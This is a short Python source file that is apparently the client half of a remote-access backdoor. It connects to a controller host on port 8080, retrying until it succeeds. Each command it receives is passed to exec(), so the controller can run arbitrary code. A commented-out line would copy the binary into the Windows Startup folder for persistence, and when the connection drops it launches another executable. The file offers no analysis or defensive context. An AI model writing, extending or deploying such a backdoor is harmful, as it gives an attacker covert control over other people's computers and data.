import socket
import os
import sys
import shutil
import subprocess


def cmd(x, i):
    for y in range(i):
        os.system(x)


# shutil.move(os.path.dirname(sys.executable) + "\\slave.exe", os.environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\slave.exe")
# print(__file__.split("\\")[-1])
director = os.path.dirname(sys.executable)
filename = "slavemanual.exe"
fullpath = os.path.join(director, filename)
s = socket.socket()
host = "S20364-PC"
port = 8080
connected = False
while not connected:
    try:
        s.connect((host, port))
        connected = True
    except Exception as e:
        # print("Could not connect to server")
        connected = False


# print("Connected to server!")

while True:
    try:
        command = s.recv(1024)
        command = command.decode()
        s.send("Command Received!".encode())
        exec(command)
    except Exception as e:
        # print("Host has disconnected!")
        s.close()
        break

subprocess.call(fullpath)
exit()
